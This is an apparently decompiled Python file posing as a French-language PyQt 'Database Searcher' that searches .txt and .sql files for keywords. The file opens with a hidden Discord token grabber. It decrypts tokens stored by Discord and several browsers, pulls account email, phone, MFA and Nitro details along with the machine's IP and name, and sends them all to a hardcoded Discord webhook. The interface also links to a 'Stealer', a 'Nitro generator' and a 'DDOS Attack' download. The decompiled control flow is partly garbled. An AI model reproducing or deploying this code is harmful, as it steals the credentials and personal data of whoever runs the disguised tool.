# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Search Data #NEW.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:(-16)].decode()
    except:
        return 'Error'

def getip():
    ip = 'None'
    try:
        ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    else:  # inserted
        return ip

def gethwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {'Discord': roaming + '\\discord', 'Discord Canary': roaming + '\\discordcanary', 'Lightcord': roaming + '\\Lightcord', 'Discord PTB': roaming + '\\discordptb', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Amigo\\User Data', 'Torch': local + '\\Torch\\User Data', 'Kometa': local + '\\Kometa\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'CentBrowser': local + '\\CentBrowser\\User Data', '7Star': local + '\\7Star\\7Star\\User Data', 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': local + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': chrome + 'Default', '\\Google\\Chrome SxS\\User Data': chrome + 'Epic Privacy Browser', '\\Epic Privacy Browser\\User Data': chrome + '\\Microsoft\\Edge\\User Data\\Defaul', '\\uCozMedia\\Uran\\User Data\\Default': chrome + '\\Yandex\\YandexBrowser\\User Data\\Default', '
    for platform, path in paths.items():
        if os.path.exists(path):
            try:
                with open(path + '\\Local State', 'r') as file:
                    pass  # postinserted
        except:
            pass
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
                    else:  # inserted
                        for file in listdir(path + '\\Local Storage\\leveldb\\'):
                            if file.endswith('.ldb') or not file.endswith('.log'):
                                try:
                                    with open(path + f'\\Local Storage\\leveldb\\{file}', 'r', errors='ignore') as files:
                                        pass  # postinserted
                                except PermissionError:
                                        for x in files.readlines():
                                            x.strip()
                                            for values in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', x):
                                                tokens.append(values)
                        else:  # inserted
                            for i in tokens:
                                if i.endswith('\\'):
                                    i.replace('\\', '')
                                else:  # inserted
                                    if i not in cleaned:
                                        cleaned.append(i)
                            for token in cleaned:
                                pass  # postinserted
                            try:
                                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    except IndexError == 'Error':
                            else:  # inserted
                                checker.append(tok)
                                for value in checker:
                                    if value not in already_check:
                                        already_check.append(value)
                                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                                        try:
                                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except:
                            pass
                                        else:  # inserted
                                            if res.status_code == 200:
                                                res_json = res.json()
                                                ip = getip()
                                                pc_username = os.getenv('UserName')
                                                pc_name = os.getenv('COMPUTERNAME')
                                                user_name = f"{res_json['username']}#{res_json['discriminator']}"
                                                user_id = res_json['id']
                                                email = res_json['email']
                                                phone = res_json['phone']
                                                mfa_enabled = res_json['mfa_enabled']
                                                has_nitro = False
                                                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                                                nitro_data = res.json()
                                                has_nitro = bool(len(nitro_data) > 0)
                                                days_left = 0
                                                if has_nitro:
                                                    d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                                    d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                                                    days_left = abs((d2 - d1).days)
                                                embed = f"**{user_name}** *({user_id})*\n\n> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{(days_left if days_left else 'None')} day(s)`\n\n> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n\n> :piñata: __Token__\n\t`{tok}`\n\nBy New.sexcalleur **|** https://discord.gg/mhkSD8vkkA"
                                                payload = json.dumps({'content': embed, 'username': 'Token Grabber - By new.sexcalleur', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                                                try:
                                                    headers2 = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                                                    req = Request('https://discord.com/api/webhooks/1297667002793459744/TFYeRjXhli-00z9xoXzInsqEnTOYFQj_-myzorgEy51ShZLgwhk3ib0zGaM0YCKDdJ5p', data=payload.encode(), headers=headers2)
                                                    urlopen(req)
                                                except:
                                                    pass
                                    else:  # inserted
                                        continue
    pass
    else:  # inserted
        pass  # postinserted
    pass
    pass
if __name__ == '__main__':
    get_token()
import sys
import os
import webbrowser
import re
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QLineEdit, QTextEdit, QFileDialog, QMessageBox, QFrame, QScrollArea
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt, QThread, pyqtSignal

class RechercheThread(QThread):
    results_found = pyqtSignal(str)
    search_complete = pyqtSignal()

    def __init__(self, dossier, mot_cle):
        super().__init__()
        self.dossier = dossier
        self.mot_cle = mot_cle

    def run(self):
        found_any = False
        result_count = 1
        for racine, _, fichiers in os.walk(self.dossier):
            for fichier in fichiers:
                if not fichier.endswith('.txt') and (not fichier.endswith('.sql')):
                    continue
                chemin_complet = os.path.join(racine, fichier)
                try:
                    with open(chemin_complet, 'r', encoding='utf-8', errors='ignore') as f:
                        pass  # postinserted
                except Exception as e:
                        contenu = f.read()
                        pattern = re.compile(re.escape(self.mot_cle), re.IGNORECASE)
                        for i, ligne in enumerate(contenu.splitlines()):
                            if pattern.search(ligne):
                                self.results_found.emit(f'<b>RESULTAT {result_count} :</b><br>・<i>Ligne {i + 1}:</i> {ligne.strip()}<br>')
                                result_count += 1
                                found_any = True
        else:  # inserted
            if not found_any:
                self.results_found.emit('<b>Aucun résultat trouvé.</b><br>')
            self.search_complete.emit()
            self.results_found.emit(f'Erreur en lisant {chemin_complet}: {str(e)}')
        else:  # inserted
            pass

class RechercheMotCleApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Searcher | New.Sexcalleur')
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet('background-color: black; color: white;')
        layout_principal = QHBoxLayout()
        cadre_gauche = QFrame()
        cadre_gauche.setStyleSheet('background-color: black; border: 1px solid #5e5e5e; border-radius: 5px; padding: 10px;')
        layout_gauche = QVBoxLayout(cadre_gauche)
        self.ajouter_boutons_discord(layout_gauche)
        layout_principal.addWidget(cadre_gauche)
        layout_contenu = QVBoxLayout()
        self.titre_label = QLabel('Database Searcher')
        self.titre_label.setFont(QFont('Arial', 18, QFont.Bold))
        self.titre_label.setAlignment(Qt.AlignCenter)
        self.titre_label.setStyleSheet('background-color: black; color: white; padding: 10px; border-radius: 5px;')
        layout_contenu.addWidget(self.titre_label)
        dossier_layout = QHBoxLayout()
        self.dossier_label = QLabel('Sélectionnez un dossier :')
        self.dossier_label.setFont(QFont('Arial', 12))
        dossier_layout.addWidget(self.dossier_label)
        self.dossier_input = QLineEdit()
        self.dossier_input.setFont(QFont('Arial', 12))
        self.dossier_input.setStyleSheet('background-color: black; color: white; border: 1px solid #5e5e5e;')
        dossier_layout.addWidget(self.dossier_input)
        self.dossier_bouton = QPushButton('Parcourir')
        self.dossier_bouton.setFont(QFont('Arial', 12))
        self.dossier_bouton.setStyleSheet('background-color: #3498db; color: white; border-radius: 5px;')
        self.dossier_bouton.clicked.connect(self.selectionner_dossier)
        dossier_layout.addWidget(self.dossier_bouton)
        layout_contenu.addLayout(dossier_layout)
        motcle_layout = QHBoxLayout()
        self.motcle_label = QLabel('Mot-clé à rechercher :')
        self.motcle_label.setFont(QFont('Arial', 12))
        motcle_layout.addWidget(self.motcle_label)
        self.motcle_input = QLineEdit()
        self.motcle_input.setFont(QFont('Arial', 12))
        self.motcle_input.setStyleSheet('background-color: black; color: white; border: 1px solid #5e5e5e;')
        motcle_layout.addWidget(self.motcle_input)
        self.recherche_bouton = QPushButton('Rechercher')
        self.recherche_bouton.setFont(QFont('Arial', 10))
        self.recherche_bouton.setStyleSheet('\n            background-color: #7f8c8d; \n            color: white; \n            border-radius: 5px; \n            border: 2px solid black;  # Bordure noire\n        ')
        self.recherche_bouton.setFixedSize(100, 30)
        self.recherche_bouton.clicked.connect(self.lancer_recherche)
        motcle_layout.addWidget(self.recherche_bouton)
        layout_contenu.addLayout(motcle_layout)
        self.resultats = QTextEdit()
        self.resultats.setFont(QFont('Courier', 10))
        self.resultats.setStyleSheet('background-color: black; color: white; border-radius: 5px;')
        self.resultats.setReadOnly(True)
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setWidget(self.resultats)
        layout_contenu.addWidget(scroll_area)
        layout_principal.addLayout(layout_contenu)
        self.setLayout(layout_principal)
        self.recherche_thread = None

    def ajouter_boutons_discord(self, layout):
        serveurs_discord = [('Mon Tiktok 📲', 'https://www.tiktok.com/@ace2discord'), ('Stealer 🚫', 'https://gofile.io/d/Bck5el'), ('Generateur Nitro 🖥️', 'https://gofile.io/d/LZ9ZNZ'), ('DDOS Attack 🛜', 'https://gofile.io/d/UMGf9V')]
        for nom, url in serveurs_discord:
            label = QLabel(nom)
            label.setFont(QFont('Arial', 10))
            label.setAlignment(Qt.AlignCenter)
            label.setStyleSheet('color: white;')
            layout.addWidget(label)
            bouton = QPushButton('Aller à 💻')
            bouton.setFont(QFont('Arial', 10))
            bouton.setStyleSheet('background-color: #3498db; color: white; border-radius: 5px; padding: 5px;')
            bouton.clicked.connect(lambda _, u=url: webbrowser.open(u))
            layout.addWidget(bouton)
            layout.addSpacing(5)

    def selectionner_dossier(self):
        dossier = QFileDialog.getExistingDirectory(self, 'Sélectionner un dossier', '')
        self.dossier_input.setText(dossier)

    def lancer_recherche(self):
        dossier = self.dossier_input.text()
        mot_cle = self.motcle_input.text()
        if not dossier or not mot_cle:
            QMessageBox.warning(self, 'Erreur', 'Veuillez entrer un dossier et un mot-clé.')
            return
        self.resultats.clear()
        self.resultats.append(f'Recherche du mot-clé \'<b>{mot_cle}</b>\' dans le dossier \'<b>{dossier}</b>\'...\n')
        self.recherche_thread = RechercheThread(dossier, mot_cle)
        self.recherche_thread.results_found.connect(self.afficher_resultat)
        self.recherche_thread.search_complete.connect(self.recherche_complete)
        self.recherche_thread.start()

    def afficher_resultat(self, resultat):
        self.resultats.append(resultat)
        self.resultats.append('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

    def recherche_complete(self):
        self.resultats.append('<b>Recherche terminée.</b><br>')
if __name__ == '__main__':
    app = QApplication(sys.argv)
    fenetre = RechercheMotCleApp()
    fenetre.show()
    sys.exit(app.exec_())